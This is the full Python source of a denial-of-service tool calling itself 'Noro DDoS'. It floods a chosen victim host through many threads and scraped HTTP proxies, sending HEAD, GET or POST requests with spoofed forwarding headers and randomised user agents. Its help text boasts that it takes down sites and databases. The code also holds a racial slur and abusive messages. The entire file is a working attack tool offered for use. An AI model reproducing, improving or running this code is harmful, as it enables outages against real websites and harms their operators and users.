import socket, threading, sys, os, random, time
try:
    import requests
    from colorama import Fore
except:
    if os.name =="nt":
        os.system("py -m pip install requests colorama")
    else:
        os.system("pip3 install requests colorama")

useragents = []
string = ["id","q","a","s","page","result","search","login","user","nigga","Noro","hiv","covid","h1n1"]
attack_type = "HEAD"
sslmode = False
new_host = ""
brute = False
nums = 0
suc = 0
bp = 0
print('\33]0;[%s] NoroVirus \a'%(suc),end='')

if os.name =="nt":
    os.system("cls")
else:
    os.system("clear")

print("""\n
   ███▄    █  ▒█████   ██▀███   ▒█████     Noro DDoS Tool Code By 413xPr06605.
   ██ ▀█   █ ▒██▒  ██▒▓██ ▒ ██▒▒██▒  ██▒                     Version ~# 1.1.0,
  ▓██  ▀█ ██▒▒██░  ██▒▓██ ░▄█ ▒▒██░  ██▒ 
  ▓██▒  ▐▌██▒▒██   ██░▒██▀▀█▄  ▒██   ██░ 
  ▒██░   ▓██░░ ████▓▒░░██▓ ▒██▒░ ████▓▒░ [*] Http Proxies Supported
  ░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░░ ▒░▒░▒░  [+] Http Dsyn Attack ,
  ░ ░░   ░ ▒░  ░ ▒ ▒░   ░▒ ░ ▒░  ░ ▒ ▒░      Easy Down Lots Of Dstat
     ░   ░ ░ ░ ░ ░ ▒    ░░   ░ ░ ░ ░ ▒   [+] Forwarded Header For Cloud CDN
           ░     ░ ░     ░         ░ ░  
                                \n""")

def ranip():
    ip = str(random.randint(1,254))+"."+str(random.randint(1,254))+"."+str(random.randint(1,254))+"."+str(random.randint(1,254))
    return ip

def GenUA():
    AW = str(random.randint(500,599))+".36"
    BV = str(random.randint(24,80))+".0."+str(random.randint(3000,4000))+"."+str(random.randint(1,200))
    OPR = str(random.randint(30,70))+".0."+str(random.randint(1000,4000))+"."+str(random.randint(1,1000))
    UCB = str(random.randint(5,12))+"."+str(random.randint(5,12))+"."+str(random.randint(0,10))+"."+str(random.randint(1,1000))
    devices = random.choice(
        [
            "IOS",
            "Windows",
            "X11",
            "Android",
            "Symbian",
            "Macintosh"
        ]
    )
    if devices =="Windows":
        version = random.choice(
            [
                "Windows NT 10.0; Win64; X64",
                "Windows NT 10.0; WOW64",
                "Windows NT 5.1; rv:7.0.1",
                "Windows NT 6.1; WOW64; rv:54.0",
                "Windows NT 6.3; Win64; x64",
                "Windows NT 6.3; WOW64; rv:13.37"
            ]
        )
    elif devices =="IOS":
        version = random.choice(
            [
                "iPhone; CPU iPhone OS 13_3 like Mac OS X",
                "iPad; CPU OS 13_3 like Mac OS X",
                "iPod touch; iPhone OS 4.3.3",
                "iPod touch; CPU iPhone OS 12_0 like Mac OS X"
            ]
        )
    elif devices =="X11":
        version = random.choice(
            [
                "X11; Linux x86_64",
                "X11; Ubuntu; Linux i686",
                "SMART-TV; Linux; Tizen 2.4.0",
                "X11; Ubuntu; Linux x86_64",
                "X11; U; Linux amd64",
                "X11; GNU/LINUX",
                "X11; CrOS x86_64 11337.33.7",
                "X11; Debian; Linux x86_64"
            ]
        )
    elif devices =="Android":
        version = random.choice(
            [
                "Linux; Android 4.2.1; Nexus 5 Build/JOP40D",
                "Linux; Android 4.3; MediaPad 7 Youth 2 Build/HuaweiMediaPad",
                "Linux; Android 4.4.2; SAMSUNG GT-I9195 Build/KOT49H",
                "Linux; Android 5.0; SAMSUNG SM-G900F Build/LRX21T",
                "Linux; Android 5.1.1; vivo X7 Build/LMY47V",
                "Linux; Android 6.0; Nexus 5 Build/MRA58N",
                "Linux; Android 7.0; TRT-LX2 Build/HUAWEITRT-LX2",
                "Linux; Android 8.0.0; SM-N9500 Build/R16NW",
                "Linux; Android 9.0; SAMSUNG SM-G950U"
            ]
        )
    elif devices =="Macintosh":
        version = random.choice(
            [
                "Macintosh; Intel Mac OS X 10_14_4",
                "Macintosh; U; Intel Mac OS X 12_10_0"
            ]
        )
    elif devices =="Symbian":
        version = random.choice(
            [
                "Series40; Nokia200/11.56; Profile/MITP-2.1 Configuration/CLDC-1.1",
                "SymbianOS/9.1; U; en-us",
                "Series30Plus; Nokia220/10.03.11; Profile/Series30Plus Configuration/Series30Plus"
            ]
        )
    borwser = random.choice(["chrome","uc","op"])
    if borwser =="chrome":
        return "User-Agent: Mozilla/5.0 ("+version+") AppleWebKit/"+ AW +" (KHTML, like Gecko) Chrome/"+ BV + " Safari/"+ AW
    elif borwser =="op":
        return "User-Agent: Mozilla/5.0 ("+version+") AppleWebKit/"+ AW +" (KHTML, like Gecko) Chrome/"+ BV + " Safari/"+ AW +" OPR/" + OPR
    elif borwser =="uc":
        return "User-Agent: Mozilla/5.0 ("+version+") AppleWebKit/"+ AW +" (KHTML, like Gecko) Version/4.0 Chrome/"+ BV + " UCBrowser/" + UCB + " Safari/"+ AW

def flood(x):
    if x < len(proxies):
        proxy = proxies[x].strip().split(":")
    else:
        proxy = random.choice(proxies).strip().split(":")
    proto = "X-Forwarded-Proto: Http\r\n"
    x_host = "X-Forwarded-Host: " + host + "\r\n"
    via = "Via: " + ranip() + "\r\n"
    client_ip = "Client-IP: " + ranip() + "\r\n"
    verHost = " HTTP/1.1\r\nHost: " + host + "\r\n"
    useragent = useragents[x] + "\r\n"
    connection = "Connection: Keep-Alive:314\r\n"
    accept = "Accept: */*\r\n"
    referer = "Referer: http://Fr33-Th3-C0d3-0f-N3ts3c-R380rn.onion/Noro-virus?id="+host+"\r\n"     
    fake_addr = "X-Forwarded-For: " + ranip() + ", " + proxy[0] + ", 1.1.1.1\r\n"
    content = "\r"
    length = "\n"
    if attack_type =="POST":
        content = "X-Requested-With: XMLHttpRequest\r\nContent-Type: application/x-www-form-urlencoded; charset=utf-8\r\n"
        length = "Content-Length: 16\r\n\nNoro-Virus-DDoS\r\n\r\n"
    eve.wait()
    if bp == 1:
        pass
    else:
        sys.exit()
    while 1:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
            s.connect_ex((str(proxy[0]), int(proxy[1])))
            try:
                if sslmode == True:
                    proto = "X-Forwarded-Proto: Https\r\n"
                    conn = "Proxy-Connection: Keep-Alive\r\n"
                    author = "Proxy-Authorization: Basic none:none\r\n\r\n"
                    sslrequest = "CONNECT " + host + ":443" + verHost + proto + conn + author
                    s.send(str(sslrequest).encode())
                for _ in range(100):
                    http = attack_type + " " + url + "?" + str(random.choice(string)) + "=" + str(random.randint(1,65535))
                    request = http + verHost + x_host + connection + accept + useragent + referer + fake_addr + client_ip + via + content + length
                    if brute == True:
                        request = http + verHost + connection + fake_addr + client_ip + via + content + length
                    s.send(str(request).encode())
                    s.send(str(request).encode())
                s.close()
                print("[%s:%s] %s "%(proxy[0],proxy[1],http))
            except:
                s.close()
        except:
            s.close()
            proxy = random.choice(proxies).strip().split(":")

def clone_proxy():
    try:
        f = open("http.txt","wb")
        rsp = requests.get("https://www.proxyscan.io/download?type=http",timeout=5)
        f.write(rsp.content)
    except:
        pass
    try:
        rsp = requests.get("https://www.proxy-list.download/api/v1/get?type=http", timeout=5)
        f.write(rsp.content)
    except:
        pass
    try:
        r = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=10000&country=all&ssl=yes&anonymity=all', timeout=5) # Code By GogoZin
        f.write(r.content)
    except:
        f.close()
    f.close()

def check_proxy():
    global nums
    global proxies
    global suc
    nums = 0
    thread_list=[]
    for lines in list(proxies):
        th = threading.Thread(target=checking_proxy,args=(lines,))
        th.start()
        thread_list.append(th)
        time.sleep(0.03)
        sys.stdout.flush()
    for th in list(thread_list):
        th.join()
        sys.stdout.flush()
    with open(ipfile, 'wb') as fp:
        for lines in list(proxies):
            fp.write(bytes(lines,encoding='utf8'))
    fp.close()

def checking_proxy(lines):
    global nums
    global proxies
    global suc
    proxy = lines.strip().split(":")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
        s.settimeout(5)
        s.connect((str(proxy[0]), int(proxy[1])))
        if sslmode == True:
            s.send(str("CONNECT "+host+":443 HTTP/1.1\r\nHost: "+host+"\r\nX-Forwarded-Proto: Https\r\nProxy-Connection: Keep-Alive\r\nProxy-Authorization: Basic bm9uZTpub25l\r\n\r\n").encode())
        s.send(str.encode("GET "+url+" HTTP/1.1\r\nHost: "+host+"\r\n\r\n"))
        s.close()
        suc += 1
        print('\33]0;[%s] NoroVirus-[Load]\a'%(suc),end='')
        sys.stdout.write(Fore.BLUE+"Checking "+Fore.CYAN+"["+Fore.WHITE+str(proxy[0])+Fore.CYAN+"]-["+Fore.GREEN+"Connected"+Fore.CYAN+"] \n"+Fore.YELLOW+"Number "+Fore.CYAN+"["+Fore.WHITE+str(nums)+Fore.CYAN+"] \r"+Fore.RESET)
    except:
        s.close()
        sys.stdout.write(Fore.BLUE+"Checking "+Fore.CYAN+"["+Fore.WHITE+str(proxy[0])+Fore.CYAN+"]-["+Fore.RED+"Disconnected"+Fore.CYAN+"] \n"+Fore.YELLOW+"Number "+Fore.CYAN+"["+Fore.WHITE+str(nums)+Fore.CYAN+"] \r"+Fore.RESET)
        proxies.remove(lines)
    nums = nums + 1

if len(sys.argv) < 4:
    print("Usage : %s <host> <threads> <path> "%(sys.argv[0]))
    print("        --help For More Commands\n")
    if "--help" in sys.argv:
        print("\n --check  | Check Proxy Connection")
        print(" --clone  | Download Proxy List")
        print(" --ssl    | Enable TLS/SSL Proxy")
        print(" --brute  | Launch Brute Mode")
        print("\nAttack Request Method Can Be Change Like:\n")
        print(" --method=GET   |  GET Method Can Cost Lots Of CPU Usage")
        print(" --method=HEAD  |  HEAD Method Can Enable Dsyn Attack")
        print(" --method=POST  |  POST Method Easy Take Down Database\n")
    sys.exit()

if "--help" in sys.argv:
    print("\n --check  | Check Proxy Connection")
    print(" --clone  | Download Proxy List")
    print(" --ssl    | Enable TLS/SSL Proxy")
    print(" --brute  | Launch Brute Mode")
    print("\nAttack Request Method Can Be Change Like:\n")
    print(" --method=GET   |  GET Method Can Cost Lots Of CPU Usage")
    print(" --method=HEAD  |  HEAD Method Can Enable Dsyn Attack")
    print(" --method=POST  |  POST Method Easy Take Down Database\n")
    sys.exit()

if "--ssl" in sys.argv:
    sslmode = True

host = str(sys.argv[1])
if "http://" in host:
    for _ in range((len(host)-7)):
        new_host += host[_+7]
    host = new_host
elif "https://" in host:
    for _ in range((len(host)-8)):
        new_host += host[_+8]
    host = new_host
if ".edu" in host or ".gov" in host or "bank" in host or ".tw" in host:
    print("\n  > %s < \n"%(host))
    print("\nThis Url Can't Be Noro's Target\n\n")
    print("Go Fuck Yourself Skid !")
    sys.exit()
else:
    pass
    bp = 1
thr = int(sys.argv[2])
path = str(sys.argv[3])
if sslmode == True:
    url = "https://" + host + path
else:
    url = "http://" + host + path

if "--method=GET" in sys.argv:
    attack_type = "GET"

if "--method=POST" in sys.argv:
    attack_type = "POST"

if "--brute" in sys.argv:
    brute = True

if "--clone" in sys.argv:
    clone_proxy()
    ipfile = "http.txt"

if "--file" in sys.argv:
    ipfile = str(input("Custom Proxy File : "))
    print('\33]0;[%s] NoroVirus-[Wait]-[Not Checked]\a'%(suc),end='')

try:
    proxies = open(ipfile).readlines()
except:
    print("No Available Proxy File Selected\n")
    print("Use --clone To Download Noro Proxy")
    print("Or --file To Custom Your Own Proxy List\n")
    sys.exit()

if "--check" in sys.argv:
    check_proxy()
    print('\33]0;[%s] NoroVirus-[Wait]\a'%(suc),end='')

eve = threading.Event()

for _ in range(thr):
    ua = GenUA()
    useragents.append(ua)

for x in range(thr):
    threading.Thread(target=flood, daemon=True, args=(x,)).start()

print("\nVictim Host Set As => %s \n" %(host))
time.sleep(1)
print("Threads Set As => %s \n"%(thr))
time.sleep(1)
if sslmode ==True:
    print("TLS/SSL Mode [Enable]")
else:
    print("TLS/SSL Mode [Disable]")
if brute ==True:
    print("Brute Mode [Enable]")
else:
    print("Brute Mode [Disable]")
time.sleep(1)
print("Total NoroVirus => %s \n"%(len(proxies)))

input("\nEnter For Launch Noro DDoS Attack\n")
print('\33]0;[%s] NoroVirus-[Flood]\a'%(len(proxies)),end='')
eve.set()
while 1:
    try:
        input("")
        sys.exit()
    except:
        sys.exit()
